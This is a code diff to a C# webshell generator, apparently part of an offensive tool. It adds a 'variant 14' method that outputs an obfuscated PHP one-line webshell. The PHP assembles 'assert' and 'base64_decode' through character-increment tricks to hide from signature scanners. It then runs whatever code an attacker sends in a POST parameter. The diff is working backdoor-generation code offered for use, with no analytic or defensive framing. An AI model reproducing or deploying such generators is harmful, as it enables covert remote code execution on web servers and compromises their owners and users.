@@ -97,6 +97,9 @@ namespace C2.Business.CastleBravo.WebShellTool
                 case "变种13":
                     ret = GenOneWord13(Password);
                     break;
+                case "变种14":
+                    ret = GenOneWord14(Password);
+                    break;
                 case "哥斯拉配套Trojan":
                     ret = GenGodzilla(Password, Key, EncryType);
                     break;
@@ -377,6 +380,38 @@ namespace C2.Business.CastleBravo.WebShellTool
               .AppendLine(string.Format("yuag_array(\"trea\",$_POST['{0}']);", password));
             return sb.ToString();
         }
+
+        private string GenOneWord14(string password)
+        {
+            StringBuilder sb = new StringBuilder();
+            sb.AppendLine(@"<?php ")
+              .AppendLine("$_=\"\";")
+              .AppendLine("$_[+$_]++;")
+              .AppendLine("$_=$_.\"\";")
+              .AppendLine("$___=$_[+\"\"];") //A
+              .AppendLine("$____=$___;")
+              .AppendLine("$____++;")        //B
+              .AppendLine("$_____=$____;")
+              .AppendLine("$_____++;")       //C
+              .AppendLine("$______=$_____;")
+              .AppendLine("$______++;")      //D
+              .AppendLine("$_______=$______;")
+              .AppendLine("$_______++;")     //E
+              .AppendLine("$________=$_______;")
+              .AppendLine("$________++;$________++;$________++;$________++;$________++;$________++;$________++;$________++;$________++;$________++;") //O
+              .AppendLine("$_________=$________;")
+              .AppendLine("$_________++;$_________++;$_________++;$_________++;") //S
+              .AppendLine("$_=$____.$___.$_________.$_______.'6'.'4'.'_'.$______.$_______.$_____.$________.$______.$_______;")
+              .AppendLine("$________++;$________++;$________++;") //R
+              .AppendLine("$_____=$_________;")
+              .AppendLine("$_____++;") //T
+              .AppendLine("$__=$___.$_________.$_________.$_______.$________.$_____;")
+              .AppendLine(string.Format("$__($_(\"{0}\"));", ST.EncodeBase64(string.Format("eval($_POST[{0}])", password))))
+.AppendLine("?>");
+            return sb.ToString();
+        }
+
+
 
     }
 }
